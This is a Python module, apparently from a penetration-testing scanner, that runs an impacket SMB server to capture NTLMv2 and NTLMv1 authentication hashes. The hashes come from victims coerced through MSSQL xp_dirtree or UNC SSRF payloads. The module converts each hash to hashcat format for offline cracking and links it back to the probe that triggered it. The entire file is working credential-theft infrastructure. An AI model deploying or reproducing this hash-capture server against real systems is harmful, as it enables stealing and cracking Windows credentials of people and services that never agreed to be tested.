"""
smb_sink.py — Capture NTLMv2 hashes from MSSQL `xp_dirtree` UNC coercion
and other Windows UNC pivot vectors.

Wraps impacket.smbserver.SimpleSMBServer in a daemon thread and attaches
a logging handler that parses hash_string lines out of impacket's logger.
Hits are surfaced in Responder / hashcat -m 5600 compatible format.

Default listen port is 4445 (non-privileged). Port 445 requires root +
pf/iptables redirect; pass `listen_port=445` only when running with
elevated capability. Most modern Windows clients honor port-suffixed
UNC syntax (\\\\host:4445\\share) for testing — see the test plan in
hxxpsin's Windows-probe rollout for the recommended dev setup.

Mirrors the PayloadServer token-correlation pattern (`mint_token` /
`hits_for`) so SQLProbe can attribute inbound auth attempts back to the
probe that triggered them. Falls back gracefully — if impacket is
missing the constructor will refuse to start and probes downstream
should check `available`.
"""

import asyncio
import logging
import re
import threading
import time
import uuid
from dataclasses import dataclass
from pathlib import Path
from tempfile import TemporaryDirectory
from typing import Optional


# ---------------------------------------------------------------------------
# Hit record
# ---------------------------------------------------------------------------

@dataclass
class NTLMHit:
    """One captured NTLMv2 (or v1) authentication attempt."""
    token: str                    # correlation token (empty if attribution failed)
    remote_address: str           # source IP:port of the SMB client
    username: str
    domain: str
    hash_string: str              # hashcat -m 5600 format (or -m 5500 for NTLMv1)
    hash_version: str             # "ntlmv2" | "ntlmv1"
    timestamp: float

    def to_dict(self) -> dict:
        return {
            "token": self.token,
            "remote_address": self.remote_address,
            "username": self.username,
            "domain": self.domain,
            "hash_string": self.hash_string,
            "hash_version": self.hash_version,
            "timestamp": self.timestamp,
        }


# Hashcat-format NTLMv2: USER::DOMAIN:challenge:NTresponse-head:NTresponse-tail
# All segments after the first :: are hex.
_NTLMV2_RE = re.compile(
    r"^([^:\s]*)::([^:\s]*):([0-9a-fA-F]+):([0-9a-fA-F]+):([0-9a-fA-F]+)\s*$"
)
# Hashcat-format NTLMv1: USER::DOMAIN:LMresp:NTresp:challenge
_NTLMV1_RE = re.compile(
    r"^([^:\s]*)::([^:\s]*):([0-9a-fA-F]{48}):([0-9a-fA-F]{48}):([0-9a-fA-F]{16})\s*$"
)
# "Incoming connection (1.2.3.4,49152)" — impacket's connect log
_INCOMING_RE = re.compile(r"[Ii]ncoming connection\s*\(?([0-9a-fA-F.:]+)[,)]\s*(\d+)?")
# Path/share references that contain a token
_PATH_RE = re.compile(r"[\\/]([A-Za-z0-9_-]+)")


# ---------------------------------------------------------------------------
# Logging handler — extracts hashes + connection metadata from impacket logs
# ---------------------------------------------------------------------------

class _CaptureHandler(logging.Handler):
    """Attaches to impacket's logger and routes any hash_string / connection
    line through the sink. The handler is intentionally permissive — it only
    needs to recognize the patterns; everything else is ignored."""

    def __init__(self, sink: "SMBSink") -> None:
        super().__init__()
        self._sink = sink
        self._last_remote: str = ""

    def emit(self, record: logging.LogRecord) -> None:
        try:
            msg = record.getMessage().strip()
        except Exception:
            return

        # Connection bookkeeping
        m_in = _INCOMING_RE.search(msg)
        if m_in:
            ip = m_in.group(1)
            port = m_in.group(2) or ""
            self._last_remote = f"{ip}:{port}" if port else ip
            return

        # NTLMv2 hash line
        m = _NTLMV2_RE.match(msg)
        if m:
            user, domain, _challenge, _nt_head, _nt_tail = m.groups()
            self._sink._record_hash(
                username=user, domain=domain,
                hash_string=msg, hash_version="ntlmv2",
                remote_address=self._last_remote,
            )
            return

        # NTLMv1 hash line — rarer but seen on legacy MSSQL service accounts
        m = _NTLMV1_RE.match(msg)
        if m:
            user, domain, _lm, _nt, _challenge = m.groups()
            self._sink._record_hash(
                username=user, domain=domain,
                hash_string=msg, hash_version="ntlmv1",
                remote_address=self._last_remote,
            )
            return

        # Path / share traversal — used to attribute hashes to tokens
        if "TREE_CONNECT" in msg or "tree" in msg.lower() or "Path" in msg:
            for m_tok in _PATH_RE.finditer(msg):
                tok = m_tok.group(1)
                if tok and self._last_remote:
                    self._sink._track_path_access(tok, self._last_remote)


# ---------------------------------------------------------------------------
# Sink — public API
# ---------------------------------------------------------------------------

class SMBSink:
    """SMB server that records inbound NTLM authentication for offline
    cracking. Designed to be paired with `mssql_xp_dirtree` / `unc_ssrf_targets`
    payloads from payloads.py."""

    def __init__(
        self,
        listen_port: int = 4445,
        listen_host: str = "0.0.0.0",
        share_name: str = "hxxpsin",
    ) -> None:
        self.listen_port = listen_port
        self.listen_host = listen_host
        self.share_name = share_name
        self._hits: list[NTLMHit] = []
        self._tokens: set[str] = set()
        # (timestamp, token, remote_address) — used for hash↔token attribution
        self._path_log: list[tuple[float, str, str]] = []
        self._server = None
        self._thread: Optional[threading.Thread] = None
        self._tmpdir: Optional[TemporaryDirectory] = None
        self._handler: Optional[_CaptureHandler] = None
        self._lock = threading.Lock()
        self._start_error: Optional[str] = None

    # ── lifecycle ───────────────────────────────────────────────────────

    @property
    def available(self) -> bool:
        """True once the SMB server is bound and the capture handler is wired."""
        return self._server is not None

    @property
    def listen_url(self) -> str:
        return f"smb://{self.listen_host}:{self.listen_port}/{self.share_name}"

    @property
    def start_error(self) -> Optional[str]:
        return self._start_error

    async def start(self) -> None:
        try:
            from impacket import smbserver
        except ImportError as exc:
            self._start_error = f"impacket missing: {exc}"
            raise RuntimeError(
                "impacket is required for SMBSink — install with "
                "`pip install 'impacket>=0.11.0'`"
            ) from exc

        self._tmpdir = TemporaryDirectory(prefix="hxxpsin-smb-")
        share_path = Path(self._tmpdir.name)
        # Drop a benign file so polite clients see something on directory walk
        (share_path / "probe.txt").write_text("hxxpsin\n", encoding="utf-8")

        try:
            srv = smbserver.SimpleSMBServer(
                listenAddress=self.listen_host,
                listenPort=self.listen_port,
            )
            srv.addShare(self.share_name.upper(), str(share_path),
                         "hxxpsin capture share")
            srv.setSMB2Support(True)
            # Empty logfile path → don't write to disk; we capture via logger
            srv.setLogFile("")
        except Exception as exc:
            self._start_error = f"SimpleSMBServer init failed: {exc}"
            self._cleanup_tmpdir()
            raise

        # Attach capture handler to impacket's logger AND the root logger,
        # because impacket emits some lines via the root logger directly.
        self._handler = _CaptureHandler(self)
        self._handler.setLevel(logging.INFO)
        logging.getLogger("impacket").addHandler(self._handler)
        logging.getLogger("impacket").setLevel(logging.INFO)
        logging.getLogger().addHandler(self._handler)

        self._server = srv
        self._thread = threading.Thread(
            target=self._serve_forever,
            daemon=True,
            name="hxxpsin-smb-sink",
        )
        self._thread.start()
        # Give the OS a chance to bind before downstream probes fire
        await asyncio.sleep(0.15)

    def _serve_forever(self) -> None:
        try:
            self._server.start()
        except Exception as exc:
            # Surface error but don't crash the host process
            self._start_error = f"SMB server thread crashed: {exc}"

    async def stop(self) -> None:
        if self._server is not None:
            try:
                self._server.stop()
            except Exception:
                pass
            self._server = None
        if self._handler is not None:
            try:
                logging.getLogger("impacket").removeHandler(self._handler)
                logging.getLogger().removeHandler(self._handler)
            except Exception:
                pass
            self._handler = None
        if self._thread is not None:
            if self._thread.is_alive():
                self._thread.join(timeout=2.0)
            self._thread = None
        self._cleanup_tmpdir()

    def _cleanup_tmpdir(self) -> None:
        if self._tmpdir is not None:
            try:
                self._tmpdir.cleanup()
            except Exception:
                pass
            self._tmpdir = None

    async def __aenter__(self) -> "SMBSink":
        await self.start()
        return self

    async def __aexit__(self, *exc) -> None:
        await self.stop()

    # ── token correlation ──────────────────────────────────────────────

    def mint_token(self, kind: str = "smb") -> str:
        """Issue a correlation token. Encode this into the share/path portion
        of the UNC payload (`\\\\host\\<token>\\probe`) so inbound auth can be
        attributed back to the originating probe."""
        token = f"{kind}-{uuid.uuid4().hex[:12]}"
        with self._lock:
            self._tokens.add(token)
        return token

    def hits_for(self, token: str) -> list[NTLMHit]:
        """Return NTLM hits attributed to this token. Attribution is by
        path-log first (`token` appears in a TREE_CONNECT path), falling back
        to source-IP match within a short time window of the token's mint."""
        with self._lock:
            # Path-based attribution
            remotes_for_token: set[str] = set()
            for _, tok, remote in self._path_log:
                if tok == token:
                    remotes_for_token.add(remote)
            return [h for h in self._hits
                    if h.token == token or h.remote_address in remotes_for_token]

    def all_hits(self) -> list[NTLMHit]:
        """Every captured hash, regardless of attribution. Useful for the
        reporter section ("all hashes captured during the scan") and for
        operators who want to crack opportunistically."""
        with self._lock:
            return list(self._hits)

    def to_dict(self) -> dict:
        with self._lock:
            return {
                "available": self.available,
                "listen": f"{self.listen_host}:{self.listen_port}",
                "share": self.share_name,
                "start_error": self._start_error,
                "tokens_minted": len(self._tokens),
                "hits_captured": len(self._hits),
                "hits": [h.to_dict() for h in self._hits],
            }

    # ── internal: capture-handler callbacks ────────────────────────────

    def _record_hash(
        self, *,
        username: str, domain: str,
        hash_string: str, hash_version: str,
        remote_address: str,
    ) -> None:
        # Path-log attribution — walk recent entries for this remote
        token = ""
        with self._lock:
            for _, tok, remote in reversed(self._path_log):
                if remote == remote_address and tok in self._tokens:
                    token = tok
                    break
            self._hits.append(NTLMHit(
                token=token,
                remote_address=remote_address,
                username=username,
                domain=domain,
                hash_string=hash_string,
                hash_version=hash_version,
                timestamp=time.time(),
            ))

    def _track_path_access(self, candidate_token: str, remote_address: str) -> None:
        with self._lock:
            if candidate_token in self._tokens:
                self._path_log.append((time.time(), candidate_token, remote_address))
                # Bound memory — keep the most recent 500 entries
                if len(self._path_log) > 1000:
                    self._path_log = self._path_log[-500:]
